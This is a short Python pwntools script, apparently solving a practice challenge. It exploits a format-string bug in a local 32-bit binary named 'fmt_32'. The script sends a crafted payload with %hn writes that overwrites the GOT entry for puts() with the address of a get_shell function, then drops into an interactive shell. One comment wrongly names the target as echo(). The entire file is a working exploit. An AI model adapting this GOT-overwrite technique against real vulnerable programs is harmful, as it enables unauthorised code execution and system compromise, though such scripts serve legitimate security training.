#!/usr/bin/python3
from pwn import *
#context.log_level="debug"

io = process('./fmt_32')
elf = ELF('./fmt_32')
puts_got = elf.got['puts']
get_shell_addr = elf.symbols['get_shell']
id_addr = elf.symbols['id']

io.recvuntil(b"You can type exactly 256 charecters ...\n")
def change_addr():
    # addr
    payload = b""
    payload += p32(id_addr)
    payload += p32(puts_got + 2)
    payload += p32(puts_got)
    #change address of puts() got to echo()
    payload += b"%" + str(1234 - 0xc).encode() + b'c'
    payload += b"%7$hn"
    payload += b"%" + str((get_shell_addr >> 16) - 1234).encode() + b'c'
    payload += b"%8$hn"
    payload += b"%" + str((get_shell_addr & 0xffff) - (get_shell_addr >> 16)).encode() + b'c'
    payload += b"%9$hn"
    io.sendline(payload)

change_addr()
io.interactive()
io.close()
